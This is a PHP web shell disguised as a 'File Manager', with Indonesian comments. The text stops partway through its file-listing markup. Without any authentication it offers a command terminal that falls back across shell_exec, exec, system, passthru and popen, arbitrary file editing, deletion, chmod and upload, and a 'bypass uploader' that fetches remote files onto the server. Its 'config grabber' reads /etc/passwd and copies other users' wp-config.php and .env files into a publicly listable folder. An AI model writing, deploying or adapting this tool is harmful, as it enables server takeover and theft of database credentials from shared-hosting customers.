<?php
error_reporting(0);
ini_set('display_errors', 0);
// Mendapatkan direktori yang dipilih dari parameter 'dir', jika tidak ada gunakan __DIR__ (direktori saat ini)
$directory = isset($_GET['dir']) ? $_GET['dir'] : __DIR__; 

// Validasi apakah direktori yang dipilih ada dan valid
if (!is_dir($directory)) {
    die("Direktori tidak valid.");
}

// Mendapatkan daftar file dan folder dalam direktori yang dipilih
$files = scandir($directory);
$files = array_diff($files, array('.', '..')); // Menghapus '.' dan '..' dari daftar file

// Pisahkan folder dan file biasa
$dirs = [];
$regularFiles = [];
foreach ($files as $file) {
    $filePath = $directory . DIRECTORY_SEPARATOR . $file;
    if (is_dir($filePath)) {
        $dirs[] = $file;  // Menyimpan folder
    } else {
        $regularFiles[] = $file;  // Menyimpan file biasa
    }
}

// Gabungkan folder dan file biasa menjadi satu array
$sortedFiles = array_merge($dirs, $regularFiles);

// Dapatkan informasi server
$serverInfo = php_uname();
$serverIP = $_SERVER['SERVER_ADDR'];
$phpVersion = phpversion();
$currentDir = htmlspecialchars($directory);  
$showTools = isset($_GET['show_tools']) ? true : false;
$showUpload = isset($_GET['show_upload']) ? true : false;
$showCmd = isset($_GET['show_cmd']) ? true : false;
$showFinder = isset($_GET['show_finder']) ? true : false;
// Fungsi rekursif untuk mencari file/folder
function searchFile($dir, $filename) {
    $results = [];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            // Jika direktori, cari rekursif dan tambahkan folder yang cocok
            if (stripos($item, $filename) !== false) {
                $results[] = $fullPath;  // Menambahkan folder ke hasil
            }
            $results = array_merge($results, searchFile($fullPath, $filename));
        } elseif (stripos($item, $filename) !== false) {
            // Jika file ditemukan, tambahkan ke hasil
            $results[] = $fullPath;
        }
    }
    return $results;
}
// Menangani pencarian file jika form dikirim
$searchResults = [];
if (isset($_GET['search']) && isset($_GET['dir'])) {
    $searchDir = $_GET['dir'];
    $searchName = $_GET['search'];

    if (is_dir($searchDir)) {
        $searchResults = searchFile($searchDir, $searchName);
    } else {
        $searchResults[] = "Direktori tidak valid.";
    }
}
// Proses mengunduh Adminer
if (isset($_GET['download_adminer'])) {
    $adminerUrl = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    $destination = $directory . "/adminer.php";

    // Mengunduh file Adminer
    $fileContents = file_get_contents($adminerUrl);
    if ($fileContents) {
        file_put_contents($destination, $fileContents);
        header('Location: ?dir=' . urlencode($directory) . '&adminer_downloaded=1');
    } else {
        header('Location: ?dir=' . urlencode($directory) . '&adminer_download_failed=1');
    }
    exit;
}
// Membaca file /etc/passwd dan mengekstrak username
$users = [];
if ($handle = fopen("/etc/passwd", "r")) {
    while (($line = fgets($handle)) !== false) {
        $parts = explode(":", $line);
        $users[] = $parts[0]; // Ambil nama pengguna
    }
    fclose($handle);
}

// Fungsi untuk mencari file konfigurasi dalam subfolder level 1
function findConfigFiles($baseDir) {
    $configFiles = [];
    $subDirs = glob($baseDir . '/*', GLOB_ONLYDIR); // Dapatkan semua folder langsung di bawah baseDir
    
    foreach ($subDirs as $subDir) {
        // Tentukan file yang ingin dicari
        $filesToSearch = ['wp-config.php', 'configuration.php', '.env', 'config.db.php', 'config.php'];

        foreach ($filesToSearch as $file) {
            $filePath = $subDir . '/' . $file;
            if (file_exists($filePath)) {
                $configFiles[] = $filePath; // Simpan path file konfigurasi yang ditemukan
            }
        }
    }

    return $configFiles;
}

// Menyimpan hasil pencarian di dalam array
$configFiles = [];
foreach ($users as $user) {
    $baseDir = "/home/$user/public_html"; // Direktori base untuk mencari

    // Cari file konfigurasi dalam subfolder 1 tingkat di bawah public_html
    $configFiles = array_merge($configFiles, findConfigFiles($baseDir));
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $file = $directory . DIRECTORY_SEPARATOR . $_POST['file'];
        $action = $_POST['action'];

        // Edit file
        if ($action === 'edit' && file_exists($file)) {
            $newContent = $_POST['content'];
            file_put_contents($file, $newContent);  // Menyimpan perubahan konten
        }

        // Rename file
        if ($action === 'rename' && file_exists($file)) {
            $newName = $_POST['new_name'];
            rename($file, $directory . DIRECTORY_SEPARATOR . $newName); // Rename file
        }

// Delete file or folder
if ($action === 'delete') {
    if (file_exists($file)) {
        // Jika yang dipilih adalah folder, hapus seluruh isinya terlebih dahulu
        if (is_dir($file)) {
            deleteDirectory($file);  // Panggil fungsi untuk menghapus folder beserta isinya
        } else {
            unlink($file);  // Menghapus file
        }
    }
}


        // Change permissions
        if ($action === 'chmod' && file_exists($file)) {
            $permissions = $_POST['permissions'];
            chmod($file, octdec($permissions)); // Mengubah permissions
        }

        // Redirect ke halaman yang sama setelah aksi selesai
        header("Location: ?dir=" . urlencode($directory));
        exit;
    }
}
// Fungsi untuk menghapus folder beserta isinya
function deleteDirectory($dir) {
    // Mengambil daftar file dan folder dalam folder
    $files = array_diff(scandir($dir), array('.', '..'));
    
    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            deleteDirectory($filePath);  // Rekursif untuk menghapus folder dalam folder
        } else {
            unlink($filePath);  // Menghapus file
        }
    }
    
    // Setelah folder kosong, hapus foldernya
    rmdir($dir);
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@200..900&family=Pirata+One&family=Rampart+One&family=Rubik+Wet+Paint&display=swap" rel="stylesheet">
<style>
body {
    font-family: "Inconsolata", monospace;
    margin: 20px;
    background-color: #0f1416;
    color: #f0f0f0;
}

.file-list {
    list-style-type: none;
    padding: 0;
}

.file-item {
    background-color: #1e272c;
    border-radius: 8px;
    padding: 2.5px;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    transition: background-color 0.3s;
    width: 100%;
    margin-left: auto;
    margin-right: auto;
}

.file-item:hover {
    background-color: #444;
}

.icon {
    font-size: 20px;
    margin-right: 10px;
}

.folder-icon {
    color: #f39c12; /* Kuning untuk folder */
}

.file-icon {
    color: #8e44ad;
}

.file-name {
    flex: 1;
    margin-right: 5px;
    font-weight: bold;
    font-size: 14px;
}

.server-info {
    margin-bottom: 20px;
}

.server-info p {
    margin: 5px 0;
    font-size: 15px;
}

.server-info .label-system,
.server-info .label-ip,
.server-info .label-php,
.server-info .label-dir {
    color: #009584;
}

.server-info .value-info {
    color: #f0f0f0;
}

.select-options {
    display: flex;
    justify-content: left;
    margin-top: 20px;
}

.select-button {
    background-color: #444;
    border: none;
    color: white;
    padding: 10px;
    margin: 0 5px;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s;
}

.select-button:hover {
    background-color: #555;
}

a {
    text-decoration: none;
    color: inherit;
}

.file-item input[type="radio"] {
    margin-right: 10px;
}
/* Menambahkan CSS pada elemen induk dari .action-buttons */
.container {
    display: flex;
    justify-content: center; /* Menyusun elemen secara horizontal di tengah */
    align-items: center; /* Menyusun elemen secara vertikal di tengah */
}

/* CSS untuk .action-buttons */
.action-buttons {
    margin-top: 5px;
    display: flex;
    justify-content: center;
    border: 1px solid #0f7a54;
    border-radius: 15px;
    padding: 15px;
    width: 70%;
    max-width: 300px;
    background-color: rgba(0, 0, 0, 0.5);
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
}

.action-button {
    background-color: #;
    font-size: 12px;
    color: white;
    padding: 8px 15px;
    margin: 0 5px;
    border-radius: 5px;
    cursor: pointer;
    display: flex;
    align-items: center;
    transition: background-color 0.3s;
    text-align: center;
}

.action-button:hover {
    background-color: #555;
}
 .upload-container {
    margin-top: 20px;
    text-align: center;
}

.upload-container input[type="file"] {
    padding: 10px;
    background-color: #444;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

.upload-container button {
    background-color: #0f7a54;
    color: white;
    padding: 10px 20px;
    border-radius: 5px;
    cursor: pointer;
    margin-top: 10px;
    border: none;
}

.upload-container button:hover {
    background-color: #444;
}
.title {
    font-family: 'Rubik Wet Paint', sans-serif;
    font-size: 40px;
    color: #f0f0f0;
    text-align: center;
    margin-bottom: 30px;
}

.success-notification,
.error-notification {
    margin-top: 15px;
    padding: 10px;
    border-radius: 5px;
    text-align: center;
    width: 15%;
    margin-left: auto;
    margin-right: auto;
}

.success-notification {
    background-color: #28a745;
    color: white;
}

.error-notification {
    background-color: #dc3545;
    color: white;
    
}

.terminal-container {
    background-color: #1e272c;
    border-radius: 8px;
    padding: 20px;
    margin-top: 20px;
    max-width: 400px; /* Atur lebar maksimum */
    margin-left: auto; /* Menempatkan kontainer di tengah */
    margin-right: auto;
}

.command-input {
    width: 94%; /* Agar input lebar mengikuti kontainer */
    padding: 10px;
    margin-right: 10px;
    border: 1px solid #444;
    border-radius: 5px;
    background-color: #020d09;
    color: #f0f0f0;
}

.command-button {
    margin-top: 10px;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    background-color: #0f7a54;
    color: white;
    cursor: pointer;
}

.command-button:hover {
    background-color: #444;
}

.output {
    background-color: #020d09;
    color: lime;
    padding: 10px;
    margin-top: 15px;
    border-radius: 5px;
    white-space: pre-wrap;
    overflow-x: auto;
    font-size: 14px;
    height: 100px; /* Membatasi tinggi output */
    overflow-y: scroll; /* Menambahkan scroll vertikal */
    width: 94%; /* Lebar mengikuti kontainer */
}

.tool-buttons {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
    margin-top: 15px;
}

.tool-button {
    display: flex;
    align-items: center;
    background-color: #222;
    color: white;
    padding: 10px 20px;
    border-radius: 8px;
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
    transition: background-color 0.3s, transform 0.3s;
}

.tool-button i {
    margin-right: 8px;
    font-size: 16px;
}

.tool-button:hover {
    background-color: #444;
    transform: translateY(-3px);
    box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.3);
}
.config-grabber {
    margin-top: 20px;
    text-align: center;
    display: flex;               /* Menambahkan flexbox untuk pemusatan */
    flex-direction: column;      /* Mengatur elemen dalam satu kolom */
    align-items: center;         /* Memusatkan elemen secara horizontal */
}

.config-grabber textarea {
    width: 50%;
    height: 200px;
    margin-bottom: 10px;
    background-color: #020d09;
    color: #f0f0f0;
    border: 1px solid #444;
    border-radius: 5px;
    font-size: 14px;
    padding: 12px;
    line-height: 1.5;
    font-family: 'Courier New', Courier, monospace;
    white-space: pre-wrap;
    word-wrap: break-word;
    text-align: left;
    resize: none; /* Menonaktifkan resize jika tidak diperlukan */
}

.config-grabber button {
    padding: 10px 20px;
    background-color: #0f7a54;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    margin-top: 10px;
    text-align: center;          /* Memastikan teks tombol tetap terpusat */
}

.config-grabber button:hover {
    background-color: #444;
}
/* Styling untuk form */
.form-container {
    background-color: #1e272c; 
    border-radius: 12px; /* Menambahkan sedikit pembulatan pada sudut */
    padding: 25px; /* Menambah padding untuk ruang lebih lebar */
    max-width: 300px; /* Lebar maksimal diperbesar untuk tampilan yang lebih lebar */
    margin: 30px auto;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); /* Shadow lebih halus dan lebih besar */

}

.form-group {
    margin-bottom: 20px; /* Margin antar form group lebih besar */
}

.form-group label {
    display: block;
    font-size: 16px; /* Ukuran font label lebih besar */
    font-weight: 600; /* Menambah ketebalan font */
    color: #ecf0f1; /* Warna teks label lebih cerah */
    margin-bottom: 8px;
}

.form-group input,
.form-group textarea {
    width: 90%; /* Memperbaiki lebar input dan textarea */
    padding: 14px; /* Padding lebih besar untuk kenyamanan input */
    font-size: 16px; /* Ukuran font input lebih besar */
    border-radius: 8px; /* Menambah pembulatan sudut untuk elemen input */
    border: 1px solid #7f8c8d; /* Warna border lebih terang */
    background-color: #34495e; /* Warna latar belakang lebih terang */
    color: #ecf0f1; /* Warna teks lebih terang untuk kontras lebih baik */
}

.form-group input:focus,
.form-group textarea:focus {
    border-color: #16a085; /* Warna border saat fokus menjadi hijau muda */
    outline: none;
}

.form-group textarea {
    height: 100px; /* Lebar textarea lebih besar */
    resize: vertical; /* Memungkinkan resize hanya secara vertikal */
}

.submit-button {
    display: block;
    width: 100%;
    background-color: #0f7a54;
    color: white;
    padding: 12px;
    font-size: 16px;
    border-radius: 5px;
    border: none;
    cursor: pointer;
    transition: background-color 0.3s;
}
.submit-button:hover {
    background-color: #444;
}

/* Error message style */
.error-message {
    color: #dc3545;
    font-size: 14px;
    margin-top: 10px;
    text-align: center;
}

.success-message {
    color: #28a745;
    font-size: 14px;
    margin-top: 10px;
    text-align: center;
}
.file-namee {
    flex: 1;
    margin-right: 5px;
    font-weight: bold;
    font-size: 14px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}
.search-results {
    background-color: #1e272c;
    border-radius: 8px;
    padding: 20px;
    margin-top: 20px;
}
.search-results h3 {
    color: #f0f0f0;
    font-size: 24px;
}
.search-results ul {
    list-style-type: none;
    padding: 0;
    text-align: left; /* Menambahkan properti ini untuk rata kiri */
}
.search-results li {
    background-color: #031b13;
    border-radius: 8px;
    margin-bottom: 10px;
    padding: 10px;
    font-size: 13px;
    text-align: left;
    word-wrap: break-word; 
    overflow: hidden;
    box-sizing: border-box;
}
.search-results ul li a:hover {
    color: #0f7a54;
}
/* Mengatur tampilan select */
#actionSelect {
    background-color: #34495e;
    color: #ecf0f1;
    font-size: 16px;
    padding: 10px 15px;
    border-radius: 8px;
    border: 1px solid #7f8c8d;
    width: 180px; /* Ukuran lebih pas */
    margin-right: 10px;
    appearance: none; /* Menghilangkan gaya default pada select */
    -webkit-appearance: none;
    -moz-appearance: none;
    cursor: pointer;
    transition: background-color 0.3s, border-color 0.3s;
}
.select-options {
    display: flex;
    justify-content: left;
    margin-top: 20px;
    width: 250px; /* Mengatur lebar container agar lebih kecil */
    margin-left: auto;
    margin-right: auto; /* Menjaga agar tetap terpusat */
}

#actionSelect {
    width: 60%; /* Lebar select box lebih kecil */
    padding: 5px;
    font-size: 14px;
    background-color: #34495e; /* Warna latar belakang untuk select box */
    color: #ecf0f1;
    border-radius: 5px;
    border: 1px solid #7f8c8d;
}

.select-button {
    width: 35%; /* Mengatur lebar tombol agar lebih kecil */
    padding: 8px 0;
    font-size: 14px;
    margin-left: 10px; /* Memberikan jarak antara select dan tombol */
}
@media only screen and (max-width: 400px) {
    .action-button,
    .tool-button,
    .select-button {
        font-size: 15px;
        padding: 6px 12px;
    }
    .action-buttons {
       width: 80%;
       max-width: 400px;
   }
    .file-name {
        font-size: 14px;
    }

    .tool-button i,
    .action-button i {
        font-size: 11px;
    }

    .title {
        font-size: 32px;
    }

    .server-info p,
    .server-info .value-info {
        font-size: 15px;
    }
    .form-container {
        padding: 15px;
        max-width: 90%;
    }

    .form-container h2 {
        font-size: 20px;
    }

    .form-group input,
    .form-group textarea {
        font-size: 12px;
        width: 90%;
    }

    .submit-button {
        font-size: 14px;
    }
 .success-notification,
 .error-notification {
    width: 80%;
   }
 .config-grabber textarea {
    width: 80%;
 }
</style>
</head>
<body>
<div class="server-info">
    <p><span class="label-system"><strong>System Server:</strong></span> <span class="value-info"><?php echo $serverInfo; ?></span></p>
    <p><span class="label-ip"><strong>IP Server:</strong></span> <span class="value-info"><?php echo $serverIP; ?></span></p>
    <p><span class="label-php"><strong>PHP Version:</strong></span> <span class="value-info"><?php echo $phpVersion; ?></span></p>
    <p><span class="label-dir"><strong>Dir:</strong></span> 
    <?php 
    $dirs = explode(DIRECTORY_SEPARATOR, $directory); // Memecah path menjadi direktori-direktori
    $currentPath = '';
    foreach ($dirs as $index => $dir) {
        $currentPath .= $dir . DIRECTORY_SEPARATOR;
        // Membuat link setiap bagian path, kecuali yang terakhir
        echo '<a href="?dir=' . urlencode($currentPath) . '" class="value-info">' . $dir . '</a>';
        if ($index < count($dirs) - 1) {
            echo '/'; // Menambahkan pemisah " / " antara direktori
        }
    }
    ?>
</p>
</div>

<!-- Menampilkan tombol sesuai dengan nilai dari $showTools -->
<div class="container">
<div class="action-buttons">
<a href="?" class="action-button">
            <i class="fas fa-home"></i></a>
        <a href="?show_upload=1&dir=<?php echo urlencode($directory); ?>" class="action-button">
            <i class="fas fa-upload"></i></a>
        <a href="?show_cmd=1&dir=<?php echo urlencode($directory); ?>" class="action-button">
            <i class="fas fa-terminal"></i></a>
         <a href="?show_tools=1&dir=<?php echo urlencode($directory); ?>" class="action-button">
            <i class="fas fa-tools"></i></a>
<a href="?new_file=1&dir=<?php echo urlencode($directory); ?>" class="action-button">
            <i class="fas fa-file"></i></a>
<a href="?create_folder=1&dir=<?php echo urlencode($directory); ?>" class="action-button">
            <i class="fas fa-folder-plus"></i></a>
</div></div>

<!-- Form untuk membuat folder baru -->
<?php if (isset($_GET['create_folder'])): ?>
 <div class="form-container">
        <form action="" method="POST">
 <div class="form-group">
            <input type="text" id="folder_name" name="folder_name" required>
            <button type="submit" name="create_folder_btn" class="submit-button">create</button>
        </form>
    </div> </div>
<?php endif; ?>

<?php
// Menangani pembuatan folder baru
if (isset($_POST['create_folder_btn']) && isset($_POST['folder_name'])) {
    $newFolderName = $_POST['folder_name'];
    $newFolderPath = $directory . DIRECTORY_SEPARATOR . $newFolderName;

    // Cek apakah folder sudah ada
    if (!is_dir($newFolderPath)) {
        mkdir($newFolderPath, 0755);
        echo "<div class='success-notification'>Folder '$newFolderName' berhasil dibuat!</div>";
    } else {
        echo "<div class='error-notification'>Folder '$newFolderName' sudah ada.</div>";
    }
}
?>

<?php
if (isset($_GET['new_file'])) {
    ?>
    <div class="form-container">
    <form action="" method="post">
        <div class="form-group">
            <label for="file_name">Nama File</label>
            <input type="text" name="file_name" id="file_name" required>
        </div>
        <div class="form-group">
            <label for="file_content">Isi File</label>
            <textarea name="file_content" id="file_content" required></textarea>
        </div>
        <button type="submit" name="create_file" class="submit-button">Simpan File</button>
    </form></div>
<?php
}
?>
<?php
if (isset($_POST['create_file'])) {
    $fileName = $_POST['file_name'];
    $fileContent = $_POST['file_content'];

    // Validasi nama file
    if (empty($fileName)) {
        echo "<div class='error-notification'>Nama file tidak boleh kosong.</div>";
    } else {
        $filePath = $directory . DIRECTORY_SEPARATOR . $fileName;

        // Menyimpan file
        if (file_put_contents($filePath, $fileContent)) {
            echo "<div class='success-notification'>OK</div>";
        } else {
            echo "<div class='error-notification'>ERROR</div>";
        }
    }
}
?>

 <!-- PHP untuk menampilkan notifikasi -->
<?php if (isset($_GET['adminer_downloaded'])): ?>
    <?php
    // URL dasar situs (misalnya https://media.iloveto.cyou)
    $baseUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
    // Mengambil path relatif direktori saat ini tanpa path penuh
    $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $directory);
    ?>
    <div class="success-notification">
        <!-- Gabungkan URL dasar dengan path relatif ke adminer.php -->
        <a href="<?php echo htmlspecialchars($baseUrl . $relativePath . '/adminer.php'); ?>" target="_blank"><i class="fas fa-external-link-alt"></i> Open
        </a>
    </div>
<?php elseif (isset($_GET['adminer_download_failed'])): ?>
    <div class="error-notification">
        Failed to create adminer.
    </div>
<?php endif; ?>


<?php if ($showTools): ?>
    <div class="tool-buttons">
        <a href="?download_adminer=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
    <i class="fas fa-download"></i> adminer
</a>
<a href="?action=configx" class="tool-button">
            <i class="fa-solid fa-poo"></i> config
        </a>
        <a href="?show_finder=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-search"></i> finder
        </a>
         <a href="?bypass_uploader=1&dir=<?php echo urlencode($directory); ?>" class="tool-button">
            <i class="fas fa-upload"></i> bypass uploader
        </a>
    </div>
<?php endif; ?>

<?php 
if (isset($_GET['bypass_uploader'])) {
    ?>
    <div class="form-container">
        <form action="" method="post">
            <div class="form-group">
                <label for="file_url">URL File</label>
                <input type="url" name="file_url" id="file_url" required>
            </div>
            <div class="form-group">
                <label for="file_name">Nama File (termasuk ekstensi)</label>
                <input type="text" name="file_name" id="file_name" required>
            </div>
            <button type="submit" name="download_file" class="submit-button">Download dan Simpan</button>
        </form>
    </div>
    <?php
}

if (isset($_POST['download_file'])) {
    $fileUrl = $_POST['file_url'];
    $fileName = $_POST['file_name'];
    $savePath = $directory . DIRECTORY_SEPARATOR . $fileName;

    // Validasi URL
    if (filter_var($fileUrl, FILTER_VALIDATE_URL)) {
        // Mendownload file dari URL
        $fileContent = file_get_contents($fileUrl);
        if ($fileContent !== false) {
            // Menyimpan file
            if (file_put_contents($savePath, $fileContent)) {
                echo "<div class='success-message'>File berhasil disimpan sebagai '$fileName' di direktori saat ini!</div>";
            } else {
                echo "<div class='error-message'>Gagal menyimpan file. Pastikan direktori memiliki izin tulis.</div>";
            }
        } else {
            echo "<div class='error-message'>Gagal mengunduh file dari URL yang diberikan.</div>";
        }
    } else {
        echo "<div class='error-message'>URL tidak valid.</div>";
    }
}
?>

<?php if ($showFinder): ?>
<div class="form-container">
    <form method="GET" action="">
        <div class="form-group">
            <label for="dir_path">Direktori</label>
            <input type="text" name="dir" id="dir_path" value="<?php echo htmlspecialchars($directory); ?>" required>
        </div>
        <div class="form-group">
            <label for="search_file">Nama File/Folder</label>
            <input type="text" name="search" id="search_file" placeholder="Masukkan nama file atau folder" required>
        </div>
        <button type="submit" class="submit-button">Cari</button>
    </form>
</div>
<?php endif; ?>

<?php if (!empty($searchResults)): ?>
    <div class="search-results">
    <h3>Hasil Pencarian:</h3>
    <ul>
        <?php foreach ($searchResults as $result): ?>
            <li>
                <a href="?dir=<?php echo urlencode(dirname($result)); ?>">
                    <?php echo htmlspecialchars($result); ?>
                </a>
            </li>
        <?php endforeach; ?>
    </ul>
</div>
<?php endif; ?>


<?php
        // Tampilkan form configx jika parameter 'action' di URL adalah 'configx'
        if (isset($_GET['action']) && $_GET['action'] == 'configx') {
            ?>
            <form action="" method="POST">
                <div class="config-grabber">
                    <textarea name="usernames" rows="10" cols="50" readonly>
                        <?php echo implode("\n", $users); ?>
                    </textarea>
                    <button type="submit" name="mek"><i class="fas fa-skull-crossbones"></i> Croot
        </a></button>
                </div>
            </form>
            <?php
        }

        // Menangani aksi tombol 'mek'
        if (isset($_POST['mek'])) {
    $configGrabberDir = __DIR__ . '/ConfigGrabber';

    // Membuat folder ConfigGrabber jika belum ada
    if (!is_dir($configGrabberDir)) {
    mkdir($configGrabberDir, 0755);

    // Membuat file .htaccess secara otomatis
    $htaccessContent = <<<EOT
Options +Indexes
AllowOverride All
Order allow,deny
Allow from all

<Files .htaccess>
    Order allow,deny
    Deny from all
</Files>
EOT;
    file_put_contents($configGrabberDir . '/.htaccess', $htaccessContent);
}
    foreach ($configFiles as $file) {
        $pathParts = explode('/', $file);
        $user = $pathParts[2]; // Ambil nama pengguna dari path (misalnya, "/home/user/public_html")
        $sub = isset($pathParts[4]) ? $pathParts[4] : 'root'; // Ambil nama subfolder jika ada
        $cms = '';

        // Tentukan CMS berdasarkan nama file
        if (strpos($file, 'wp-config.php') !== false) {
            $cms = 'WordPress';
        } elseif (strpos($file, 'configuration.php') !== false) {
            $cms = 'Joomla';
        } elseif (strpos($file, '.env') !== false) {
            $cms = 'Laravel';
        } elseif (strpos($file, 'config.db.php') !== false) {
            $cms = 'Smarty';
        } elseif (strpos($file, 'config.php') !== false) {
            $cms = 'Codeigniter';
        }

        // Buat nama file tujuan sesuai format
        if ($sub === 'root') {
            $destinationFile = $configGrabberDir . DIRECTORY_SEPARATOR . "$user-$cms.txt";
        } else {
            $destinationFile = $configGrabberDir . DIRECTORY_SEPARATOR . "$user-$sub-$cms.txt";
        }

        // Salin isi file ke file tujuan dengan format nama yang sesuai
        copy($file, $destinationFile);
    }
    $configGrabberUrl = str_replace($_SERVER['DOCUMENT_ROOT'], '', $configGrabberDir);
$baseUrl = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
$folderLink = $baseUrl . $configGrabberUrl;

echo "<div class='success-notification'>
   <a href='$folderLink' target='_blank'>>> ConfigGrabber</a>
      </div>";
}
        ?>


<!-- Form Upload File Multiple -->
<?php if ($showUpload): ?>
    <div class="upload-container">
        <div id="upload-status">
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple>
            <button type="submit" name="upload" class="upload-button">upload</button>
        </form>
<?php
if (isset($_POST['upload']) && isset($_FILES['files'])) {
    $errors = [];
    $uploadedFiles = [];
    $directory = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

    // Periksa setiap file yang diunggah
    foreach ($_FILES['files']['tmp_name'] as $index => $tmpName) {
        $fileName = $_FILES['files']['name'][$index];
        $fileTmpName = $_FILES['files']['tmp_name'][$index];
        $fileSize = $_FILES['files']['size'][$index];
        $fileError = $_FILES['files']['error'][$index];

        // Cek jika ada error saat mengunggah file
        if ($fileError !== UPLOAD_ERR_OK) {
            $errors[] = "Terjadi kesalahan saat mengunggah file.";
            continue;
        }

        // Tentukan path file tujuan
        $uploadPath = $directory . DIRECTORY_SEPARATOR . basename($fileName);

        // Pindahkan file ke direktori tujuan
        if (move_uploaded_file($fileTmpName, $uploadPath)) {
            $uploadedFiles[] = $fileName;
        } else {
            $errors[] = "Gagal mengunggah file.";
        }
    }

    // Tampilkan notifikasi unggahan
    if (!empty($errors)) {
        echo "<div class='error-notification'>ERROR</div>";
    }

    if (!empty($uploadedFiles)) {
        if (count($uploadedFiles) == 1) {
            echo "<div class='success-notification'>Successfully uploaded</div>";
        } else {
            echo "<div class='success-notification'>Files successfully uploaded</div>";
        }
    }
}
?>
        </div>
    </div>
<?php endif; ?>

<?php if ($showCmd): ?>
    <div class="terminal-container">
        <form method="post">
            <input type="text" name="command" placeholder="input your command" class="command-input" autofocus>
            <button type="submit" class="command-button">>></button>
        </form>
        <?php
        $output = '';

        if (isset($_POST['command']) && $showCmd) {
            $command = escapeshellcmd($_POST['command']);
            $directoryCommand = "cd " . escapeshellarg($directory) . " && " . $command;

            // Periksa jika shell_exec tersedia
            if (function_exists('shell_exec')) {
                $output = shell_exec($directoryCommand);
            }
            // Gunakan exec jika tersedia
            elseif (function_exists('exec')) {
                $outputArray = [];
                exec($directoryCommand, $outputArray);
                $output = implode("\n", $outputArray); // Gabungkan array hasil menjadi string
            }
            // Gunakan system jika tersedia
            elseif (function_exists('system')) {
                ob_start();
                system($directoryCommand);
                $output = ob_get_clean();
            }
            // Gunakan passthru jika tersedia
            elseif (function_exists('passthru')) {
                ob_start();
                passthru($directoryCommand);
                $output = ob_get_clean();
            }
            // Gunakan popen sebagai opsi terakhir
            elseif (function_exists('popen')) {
                $handle = popen($directoryCommand, 'r');
                if ($handle) {
                    while (!feof($handle)) {
                        $output .= fgets($handle);
                    }
                    pclose($handle);
                }
            } else {
                $output = "function is not available on this server.";
            }
        }
        ?>
        <?php if ($output): ?>
            <textarea class="output" readonly><?php echo htmlspecialchars($output); ?></textarea>
        <?php endif; ?>
    </div>
<?php endif; ?>


<?php
// Menampilkan form berdasarkan aksi yang dipilih
if (isset($_GET['action']) && isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = $directory . DIRECTORY_SEPARATOR . $file;

    if ($_GET['action'] === 'edit' && file_exists($filePath)) {
        $fileContent = file_get_contents($filePath); ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div class="form-group">
                    <label for="content">Edit File Content</label>
                    <textarea name="content" id="content"><?php echo htmlspecialchars($fileContent); ?></textarea>
                </div>
                <button type="submit" class="submit-button">Save Changes</button>
            </form>
        </div>
    <?php } elseif ($_GET['action'] === 'rename') { ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div class="form-group">
                    <label for="new_name">New File Name</label>
                    <input type="text" name="new_name" id="new_name" value="<?php echo htmlspecialchars($file); ?>">
                </div>
                <button type="submit" class="submit-button">Rename</button>
            </form>
        </div>
    <?php } elseif ($_GET['action'] === 'delete') { ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <p>Are you sure you want to delete the file "<?php echo htmlspecialchars($file); ?>"?</p>
                <button type="submit" class="submit-button">Delete</button>
            </form>
        </div>
    <?php } elseif ($_GET['action'] === 'chmod') { ?>
        <div class="form-container">
            <form method="POST">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div class="form-group">
                    <label for="permissions">Change Permissions (e.g., 755)</label>
                    <input type="text" name="permissions" id="permissions" value="755">
                </div>
                <button type="submit" class="submit-button">Change Permissions</button>
            </form>
        </div>
    <?php }
} ?>


<ul class="file-list">
    <?php if (count($sortedFiles) > 0): ?>
        <?php foreach ($sortedFiles as $file): ?>
            <?php
            $filePath = $directory . DIRECTORY_SEPARATOR . $file;
            ?>
            <li class="file-item">
                <input type="radio" name="file_selection" id="file_<?php echo htmlspecialchars($file); ?>" value="<?php echo htmlspecialchars($file); ?>">
                
